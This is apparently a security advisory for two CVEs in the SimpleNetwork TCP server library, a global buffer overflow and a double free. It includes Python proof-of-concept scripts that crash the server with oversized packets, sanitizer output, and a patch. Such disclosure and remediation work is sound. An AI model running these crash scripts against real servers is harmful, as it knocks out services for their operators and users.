## CVE-2023-52729

SimpleNetwork TCP Server commit 29bc615f0d9910eb2f59aa8dff1f54f0e3af4496 suffers from a global buffer overflow when the TCPServer receives a single large packet containing ASCII characters. Using the following python3 script will invoke a global buffer overflow.

### Root Cause 

The msg buffer, defined as a global variable with a fixed size (MAXPACKETSIZE), is being overrun. The Python client sends a buffer (buf) of 50,000 bytes, which exceeds MAXPACKETSIZE. When attempting to null-terminate the received message (msg[n]=0), the code writes beyond the allocated buffer if n is equal to MAXPACKETSIZE, leading to a buffer overflow.

### Specific Location

The overflow occurs at TCPServer::Task(void*) in TCPServer.cpp line 39, where the received message attempts to be null-terminated without ensuring that n (the number of bytes received) is within the bounds of the msg array.

```c
msg[n]=0; 
```

#### Compiling the project with address sanitizer helps confirm this issue.  Here is the makefile for the example TCPServer:

```
all: 
        g++ -Wall -o server server.cpp -I../src/ ../src/TCPServer.cpp ../src/TCPClient.cpp -std=c++11 -lpthread -fsanitize=address

```

### Starting the TCP Server

```
$ ./server 1234
```

### Proof of Concept Python3 Script

Save the proof of concept python3 script to a file named poc.py:

```
import socket

host = "localhost"
port = 1234                   
buf = b'A'*50000

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.sendall(buf)
    data = s.recv(1024)
    s.close()
    print('Received', repr(data))
except:
    print("Finished...")
```

Once the script has been saved, you can execute it with the following command:

```
$ python3 poc.py
```

### Address Sanitizer Output

```
accept client[ id:0 ip:127.0.0.1 handle:4 ]
Accepted
open client[ id:0 ip:127.0.0.1 socket:4 send:0 ]
=================================================================
==840942==ERROR: AddressSanitizer: global-buffer-overflow on address 0x5633916a57e0 at pc 0x56339168917d bp 0x7f2bd78f4d00 sp 0x7f2bd78f4cf8
WRITE of size 1 at 0x5633916a57e0 thread T2
    #0 0x56339168917c in TCPServer::Task(void*) ../src/TCPServer.cpp:39
    #1 0x7f2bdbaa63eb in start_thread nptl/pthread_create.c:444
    #2 0x7f2bdbb26a1b in clone3 ../sysdeps/unix/sysv/linux/x86_64/clone3.S:81

0x5633916a57e0 is located 0 bytes after global variable 'msg' defined in '../src/TCPServer.cpp:3:6' (0x56339169b7e0) of size 40960
0x5633916a57e0 is located 32 bytes before global variable 'num_client' defined in '../src/TCPServer.cpp:4:5' (0x5633916a5800) of size 4
SUMMARY: AddressSanitizer: global-buffer-overflow ../src/TCPServer.cpp:39 in TCPServer::Task(void*)
Shadow bytes around the buggy address:
  0x5633916a5500: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x5633916a5580: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x5633916a5600: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x5633916a5680: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x5633916a5700: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x5633916a5780: 00 00 00 00 00 00 00 00 00 00 00 00[f9]f9 f9 f9
  0x5633916a5800: 04 f9 f9 f9 f9 f9 f9 f9 04 f9 f9 f9 f9 f9 f9 f9
  0x5633916a5880: 01 f9 f9 f9 f9 f9 f9 f9 00 00 00 f9 f9 f9 f9 f9
  0x5633916a5900: 00 00 00 f9 f9 f9 f9 f9 00 00 00 00 00 f9 f9 f9
  0x5633916a5980: f9 f9 f9 f9 00 00 00 00 01 f9 f9 f9 f9 f9 f9 f9
  0x5633916a5a00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
Thread T2 created by T0 here:
    #0 0x7f2bdc047c36 in __interceptor_pthread_create ../../../../src/libsanitizer/asan/asan_interceptors.cpp:208
    #1 0x563391689cf2 in TCPServer::accepted() ../src/TCPServer.cpp:101
    #2 0x563391685646 in main /home/kali/projects/fuzzing/SimpleNetwork/example-server/server.cpp:94
    #3 0x7f2bdba456c9 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58

==840942==ABORTING
```

### Mitigation

To resolve this issue, ensure that the received message does not exceed the msg buffer size. This involves checking the size of the data received and handling cases where it exceeds MAXPACKETSIZE.

* Limit the Received Data Size: Modify the recv call to ensure that the maximum number of bytes received does not exceed MAXPACKETSIZE - 1. This leaves room for the null terminator.

* Add a Bounds Check: Before setting the null terminator, verify that n is less than MAXPACKETSIZE. If n equals MAXPACKETSIZE, you may need to handle the excess data properly or truncate the message, depending on the application's requirements.

Below is a mitigation that can be applied to the code to prevent the global buffer overflow:

```cpp
void* TCPServer::Task(void *arg) {
    int n;
    struct descript_socket *desc = (struct descript_socket*) arg;
    pthread_detach(pthread_self());

    cerr << "open client[ id:"<< desc->id <<" ip:"<< desc->ip <<" socket:"<< desc->socket<<" send:"<< desc->enable_message_runtime <<" ]" << endl;
    while(1) {
        // Ensure we do not exceed the buffer size, leaving space for a null terminator
        n = recv(desc->socket, msg, MAXPACKETSIZE - 1, 0);
        if(n != -1) {
            if(n == 0) {
                // Handle client disconnection...
            }
            else {
                // Ensure the message is null-terminated
                msg[n] = 0;
                desc->message = string(msg);
                std::lock_guard<std::mutex> guard(mt);
                Message.push_back(desc);
            }
        }
        usleep(600);
    }
    // Cleanup and exit the thread...
}

```

# CVE-2022-36234

SimpleNetwork TCP Server commit 29bc615f0d9910eb2f59aa8dff1f54f0e3af4496 was discovered to contain a double free vulnerability which is exploited via crafted TCP packets. Triggering the double free will allow clients to crash any SimpleNetwork TCP server remotely. In other situations, double free vulnerabilities can cause undefined behavior and potentially code execution in the right circumstances.

# Reproduction

To ensure you have the standard build tools required to compile the library, install the following packages (on most systems this will already be installed):

```
sudo apt-get install build-essential git
```

The vulnerability can be reproduced by sending consecutive requests to the server containing a large buffer of characters in a TCP packet.  First, compile the 'libSimpleNetwork' library and example server provided in the source code:

```
git clone https://github.com/kashimAstro/SimpleNetwork.git
cd SimpleNetwork
git checkout 29bc615f0d9910eb2f59aa8dff1f54f0e3af4496
cd src
make
cd ../example-server
make
```

### Start the example-server:

```
./server 80 1
```

### Save the following python3 proof of concept script to a file (modify the host as needed):
```
import socket

host = "localhost"
port = 80                   # The same port as used by the server
buf = b'A'*10000

try:
    for i in range(50):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.sendall(buf)
        data = s.recv(1024)
        s.close()
        print('Received', repr(data))
except:
    print("Completed...")
```

### Execute the python3 script:

```
python3 poc.py
```

### Crash verification:
If successful, the server will crash and you will see the following output from the application:
```
segmentation fault  ./server 80 1
```


# References

* https://owasp.org/www-community/vulnerabilities/Doubly_freeing_memory
* https://cwe.mitre.org/data/definitions/415.html
* https://github.com/kashimAstro/SimpleNetwork/issues/22
* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36234
* https://github.com/kashimAstro/SimpleNetwork/issues/23
* https://cwe.mitre.org/data/definitions/121.html
